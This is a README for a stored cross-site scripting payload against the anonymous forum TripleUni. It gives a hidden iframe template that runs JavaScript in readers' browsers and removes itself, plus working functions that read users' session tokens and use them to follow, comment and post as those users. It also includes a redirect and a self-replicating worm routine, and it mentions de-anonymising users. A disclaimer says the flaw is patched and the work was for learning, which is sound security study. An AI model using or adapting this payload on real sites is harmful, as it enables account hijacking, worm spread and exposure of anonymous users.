# TripleUni - Script

## 声明
* 以下测试均在私密树洞进行，未进行大规模传播。
* 本测试旨在web安全学习，不会用于任何非法用途，也未对任何人或组织造成任何损失。
* 以下脚本在当前版本的TripleUni上**均已失效**，仅供学习参考。
* GitHub仓库在脚本失效前均处于私有状态(private)。

## 总结
* 通过iframe注入脚本，在其它用户打开树洞时，可以实现对TripleUni的任意操作，包括但不限于：
  * 获取用户信息
  * 获取树洞信息
  * 获取token
  * 关注树洞
  * 评论树洞
  * 发帖
  * 自我复制
  * 重定向
  * 等等
* 通过获取用户信息+跨域访问第三方服务器or实名发布树洞，可以实现**去匿名化**。
* 通过自我复制+发布树洞，甚至可以实现一个小型的**蠕虫**程序，对TripleUni进行攻击。
* **事实证明防止html注入真的很重要（doge）**

## What is it?
The script can `inject js code to tripleuni`. You can use it to edit the html of tripleuni, get the id of the post, auto follow the post, comment to the post, post, self-replication, redirect to another page and so on. `Basically, you can do anything you want`.

* TIPS: Only work for web version of tripleuni.

## How to use

### 1. Copy the code below

The code below is a template. You can copy it and paste it to tripleuni.

```html
<iframe
  id="iseeyou"
  srcdoc="
    <script type='text/javascript'>
        let pdoc = parent.document;

        // YOUR CODE HERE

        // remove self
        let self = parent.document.getElementById('iseeyou');
        self.parentNode.removeChild(self);
    </script>
    "
  width="0"
  height="0"
  frameborder="0"
  style="display: none"
>
</iframe>
```

### 2. Replace `YOUR CODE HERE` with your own code

```html
<iframe
  id="iseeyou"
  srcdoc="
    <script type='text/javascript'>
        let pdoc = parent.document;

        alert('Hello World!'); // your own code

        // remove self
        let self = parent.document.getElementById('iseeyou');
        self.parentNode.removeChild(self);
    </script>
    "
  width="0"
  height="0"
  frameborder="0"
  style="display: none"
>
</iframe>
```

- Please note that you can't use `document` to get the document of the parent page(page of tripleuni). You should use `pdoc` instead. `pdoc` is the document of the parent page. You can use it to edit the html.
- use `''` instead of `""` in your code
- Because tripleuni will replace url with an `<a>` tag, so you should use 'htt'+ 'ps://...' instead of 'https://...'

### 3. Paste the code to tripleuni and publish it

- Paste the code to tripleuni
- Click the publish button
- The script will run when you open your post on tripleuni

## Examples

You can edit the html with js. The `pdoc` variable is the document of the parent page(page of tripleuni). You can use it to edit the html.

### Edit the html

```javascript
// replace body with your own html
pdoc.body.innerHTML = `
        <head>
            <style>
                .title {
                    font-size: 50px;
                    text-align: center;
                    margin-top: 200px;
                    color: rgb(255, 0, 0);
                }
            </style>
        </head>
        <div>
            <h1 class='title'>I See You 正在保护你。</h1>
        </div>
        `;
```


### Get the id of the post
```javascript
function getPostId() {
  // get the url of the post
  let url = pdoc.location.href;
  // get the id of the post
  let id = url.split('/').pop();
  return id;
}
```

### Get token
Get token for sending data to tripleuni
````javascript
let headers = {
  'Content-Type': 'application/json',
  'authority': 'stat.uni.hkupootal.com',
  'method': 'POST',
  'path': '/api/send',
  'scheme': 'https',
  'Origin': 'htt'+'ps://tripleuni.com',
  'Referer': 'htt'+'ps://tripleuni.com',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'cross-site'

};

async function getTokenFor(url) {
  // post /api/send with data use fetch
  let data = JSON.stringify({
    'type':'event',
    'payload':{
      'website':'a9ae199b-66c0-4982-b021-0c8a6ade8691',
      'hostname':'tripleuni.com',
      'screen':'1536x864',
      'language':'zh-CN',
      'title':'主页 / HKU噗噗',
      'url':url,
      'referrer':'/home'
      }
    });

  let response = await fetch('htt'+'ps://stat.uni.hkupootal.com/api/send', {
    method: 'POST',
    headers: headers,
    body: data
  });

  let token = await response.text();
  return token;
}

````

### CORS
Because tripleuni is not in the same domain with the api of HKU噗噗, you can't use fetch to send data to the api. You should use CORS instead.
```javascript
function createCORS(method, url){
    var xhr = new XMLHttpRequest();
    if('withCredentials' in xhr){
        xhr.open(method, url, true);
    }else if(typeof XDomainRequest != 'undefined'){
        var xhr = new XDomainRequest();
        xhr.open(method, url);
    }else{
        xhr = null;
    }
    return xhr;
}
```

### Follow
Given the id of the post, follow the post.
```javascript
// follow the post
function follow(id) {
  // get parent window token in local storage
  let token = localStorage.getItem('token');
  // post /api/follow with data use fetch
  let data = {
    'uni_post_id': id,
    'token': token,
    'language': 'zh-CN'
    };
  
  let string = '';
  for (let key in data) {
    string += key + '=' + data[key] + '&';
  }
  string = string.slice(0, -1);

  let response = createCORS('POST', 'htt'+'ps://api.uni.hkupootal.com/v4/post/single/follow.php');
  if (!response) {
    throw new Error('CORS not supported');
  }

  response.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  response.send(string);

  let result = response.responseText;
  return result;
}
```

### Comment
Given the id of the post, comment msg to the post.
```javascript
function comment(id, msg) {

  let token = localStorage.getItem('token');

  let data = {
    'uni_post_id': id,
    'comment_msg': msg,
    'user_is_real_name': false,
    'token': token,
    'language': 'zh-CN'
  };

  let string = '';
  for (let key in data) {
    string += key + '=' + data[key] + '&';
  }
  string = string.slice(0, -1);

  let response = createCORS('POST', 'htt' + 'ps://api.uni.hkupootal.com/v4/comment/post.php');

  if (!response) {
    throw new Error('CORS not supported');
  }

  response.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  response.send(string);
  let result = response.responseText;
  return result;
}
```

### Post
Given the msg and post it.
```javascript
function post(msg) {
  let token = localStorage.getItem('token');
      
  let data = {
    'post_msg': msg,
    'post_topic': '%E8%B7%B3%E8%9A%A4',
    'user_is_real_name': false,
    'post_public': 2,
    'post_is_uni': false,
    'post_image': '%5B%5D',
    'token': token,
    'language': 'zh-CN'
  };
  let string = '';
  for (let key in data) {
    string += key + '=' + data[key] + '&';
  }
  string = string.slice(0, -1);

  let response = createCORS('POST', 'htt' + 'ps://api.uni.hkupootal.com/v4/post/single/post.php');

  if (!response) {
    throw new Error('CORS not supported');
  }

  response.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  response.send(string);
  let result = response.responseText;
  return result;
}
```

### Self-replication
⚠️DANGEROUS！！！
```javascript
function selfReplicationWithPost() {
  // get self iframe_srting
  let self = pdoc.getElementById('iseeyou');
  // to string
  let self_string = self.outerHTML;

  // encodeURI
  self_string = encodeURIComponent(self_string);

  // change false to true to make post public
  post(self_string, false);
}
```

### Redirect to another page

```javascript
// redirect to another page
pdoc.location.href = 'htt'+'ps://www.baidu.com';
```
